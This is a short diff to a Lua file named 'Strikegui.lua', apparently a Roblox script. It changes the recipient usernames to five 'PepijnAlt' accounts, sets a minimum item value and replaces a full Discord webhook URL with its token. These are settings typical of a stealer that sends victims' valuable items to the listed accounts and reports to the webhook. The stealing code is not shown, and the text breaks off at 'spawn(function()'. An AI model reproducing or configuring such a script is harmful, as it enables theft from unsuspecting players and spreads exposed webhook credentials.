@@ -1,8 +1,8 @@
 -- Strikegui.lua
 -- User settings
-_G.Usernames = {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"} 
+_G.Usernames = {"PepijnAlt_1", "PepijnAlt_2", "PepijnAlt_3", "PepijnAlt_4", "PepijnAlt_5"} 
 _G.minrap = 10000000
-_G.webhook = "https://discord.com/api/webhooks/1432831852065984673/4oetapbKqCwCCMUUKZORXzB4Bie1V2gaBt0DxC5PozHfRXVE8u8K4qK-Yan3tuw6-9Kn"
+_G.webhook = "https://discord.com/api/webhooks/1434627199444451561/X6JjcoEi7Df_x2xv8R67SOZzW3EBi1Qrs5I381F954qHqbPv6lxjda6sAdczP1zKxrQ8"
 
 -- Run both scripts concurrently
 spawn(function()
